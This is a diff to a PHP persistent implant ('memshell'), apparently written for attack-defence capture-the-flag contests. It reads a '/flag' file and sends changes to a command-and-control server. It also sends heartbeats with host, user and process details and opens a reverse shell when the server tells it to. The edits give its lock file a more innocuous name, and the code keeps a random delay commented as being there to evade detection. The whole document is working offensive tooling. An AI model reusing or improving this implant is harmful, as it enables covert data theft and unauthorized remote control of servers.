@@ -13,9 +13,15 @@ $c2_port = '26666';
 
 // 系统信息
 $hostname = gethostname();
-$username = get_current_user();
-$process_name = 'PHP-Memshell';
-$pid = getmypid();
+$processInfo = 'PHP-Flagstealer-Memshell' . '(' . (string)getmypid() . ')';
+if (function_exists('posix_geteuid')) {
+    $uid = posix_geteuid();
+    $info = posix_getpwuid($uid);
+    $userInfo = ($info ? $info['name'] : 'unknown') . '(' . $uid . ')';
+} else {
+    // 降级方案
+    $userInfo = get_current_user() . '(' . getmyuid() . ')';
+}
 
 // Flag相关配置
 $flag_file = '/flag';
@@ -24,7 +30,7 @@ $flag_check_interval = 1;
 $heartbeat_interval = 60;
 
 // 确保单一实例
-$lockFile = '/tmp/.php-lock';
+$lockFile = '/tmp/.php-sessions';
 $fp = fopen($lockFile, 'c');
 if (!$fp) {
     exit(1);
@@ -51,7 +57,7 @@ if (function_exists('pcntl_signal')) {
 }
 
 // HTTP请求函数
-function http_request($url, $method = 'GET', $data = null, $headers = []) {
+function makeHTTPRequest($url, $method = 'GET', $data = null, $headers = []) {
     global $max_retries, $retry_delay;
     for ($retry = 0; $retry < $max_retries; $retry++) {
         $ch = curl_init();
@@ -87,10 +93,14 @@ function http_request($url, $method = 'GET', $data = null, $headers = []) {
 }
 
 // 提交flag
-function submit_flag($flag) {
+function submitFlag($flag) {
     global $c2_host, $c2_port;
-    $url = "http://$c2_host:$c2_port/api/c2/submit-flag?flag=" . urlencode($flag);
-    $result = http_request($url);
+    $url = "http://$c2_host:$c2_port/api/c2/submit-flag";
+    $data = json_encode([
+        'flag' => $flag,
+    ]);
+    $headers = ['Content-Type: application/json'];
+    $result = makeHTTPRequest($url, 'POST', $data, $headers);
     if ($result !== false) {
         debug_log("Flag submitted: $flag");
         return true;
@@ -101,17 +111,16 @@ function submit_flag($flag) {
 }
 
 // 发送心跳包
-function send_heartbeat() {
-    global $c2_host, $c2_port, $hostname, $username, $process_name, $pid;
+function sendHeartbeat() {
+    global $c2_host, $c2_port, $hostname, $userInfo, $processInfo;
     $url = "http://$c2_host:$c2_port/api/c2/heartbeat";
     $data = json_encode([
         'hostname' => $hostname,
-        'username' => $username,
-        'pid' => (string)$pid,
-        'process_name' => $process_name
+        'userinfo' => $userInfo,
+        'processinfo' => $processInfo
     ]);
     $headers = ['Content-Type: application/json'];
-    $result = http_request($url, 'POST', $data, $headers);
+    $result = makeHTTPRequest($url, 'POST', $data, $headers);
     if ($result !== false) {
         debug_log("Heartbeat sent, response: $result");
         return intval(trim($result));
@@ -122,10 +131,10 @@ function send_heartbeat() {
 }
 
 // 获取反弹shell地址
-function get_reverse_shell_addr() {
+function getRevshellAddr() {
     global $c2_host, $c2_port;
     $url = "http://$c2_host:$c2_port/api/c2/get-rs";
-    $result = http_request($url);
+    $result = makeHTTPRequest($url);
     if ($result !== false) {
         debug_log("Got reverse shell addr: $result");
         return trim($result);
@@ -136,9 +145,9 @@ function get_reverse_shell_addr() {
 }
 
 // 执行反弹shell
-function execute_reverse_shell($addr) {
+function execRevshell($addr) {
     if (empty($addr)) return;
-    $parts = explode('|', $addr);
+    $parts = explode(':', $addr);
     if (count($parts) != 2) return;
     $host = trim($parts[0]);
     $port = intval(trim($parts[1]));
@@ -188,7 +197,7 @@ function execute_reverse_shell($addr) {
 }
 
 // 检查flag变化
-function check_flag() {
+function monitorFlag() {
     global $flag_file, $last_flag;
     if (!file_exists($flag_file)) {
         return false;
@@ -200,13 +209,13 @@ function check_flag() {
     if ($current_flag !== $last_flag) {
         $last_flag = $current_flag;
         debug_log("Flag changed: $current_flag");
-        return submit_flag($current_flag);
+        return submitFlag($current_flag);
     }
     return false;
 }
 
 // 随机延时函数 (避免检测)
-function random_sleep($min = 1, $max = 3) {
+function sleepRandomly($min = 1, $max = 3) {
     $delay = rand($min, $max);
     sleep($delay);
 }
@@ -215,20 +224,20 @@ while (true) {
     try {
         $current_time = time();
         if ($current_time - $last_flag_check >= $flag_check_interval) {
-            check_flag();
+            monitorFlag();
             $last_flag_check = $current_time;
         }
         if ($current_time - $last_heartbeat >= $heartbeat_interval) {
-            $need_shell = send_heartbeat();
+            $need_shell = sendHeartbeat();
             $last_heartbeat = $current_time;
             if ($need_shell == 1) {
-                $shell_addr = get_reverse_shell_addr();
+                $shell_addr = getRevshellAddr();
                 if (!empty($shell_addr)) {
-                    execute_reverse_shell($shell_addr);
+                    execRevshell($shell_addr);
                 }
             }
         }
-        random_sleep(1, 3);
+        sleepRandomly(1, 3);
         if (rand(1, 100) == 1) {
             gc_collect_cycles();
         }
